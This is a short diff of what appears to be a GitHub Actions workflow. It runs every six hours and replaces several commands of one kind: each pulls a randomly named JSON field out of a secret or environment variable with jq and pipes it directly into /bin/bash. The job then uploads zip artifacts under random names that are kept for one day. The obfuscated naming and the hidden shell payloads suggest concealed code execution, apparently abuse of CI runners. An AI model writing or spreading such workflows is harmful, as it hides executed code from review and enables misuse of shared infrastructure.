@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '28 5,11,17,23 * * *'
+    - cron: '13 0,6,12,18 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,17 +15,15 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          ubxs4797: ${{ secrets.ubxs4797 }}
+          lapbu09147: ${{ secrets.lapbu09147 }}
         run: |
-          printf '%s' "$ubxs4797" | jq -r .rpxbk728 | /bin/bash
-          echo $hub531 | jq -r .ppf7788 | /bin/bash
-          echo $odwx3796 | jq -r .qbmpp7436 | /bin/bash
-          echo $jops8684 | jq -r .jlax84843 | /bin/bash
-          printf '%s' "$wpq43502" | jq -r .bcan133 | /bin/bash
+          printf '%s' "$lapbu09147" | jq -r .va9848 | /bin/bash
+          printf '%s' "$fvj41405" | jq -r .qu9914 | /bin/bash
+          printf '%s' "$nn71469" | jq -r .hwaf68 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: AiMYK1K5
+          name: HcESMwok
           path: "*.zip"
           retention-days: 1
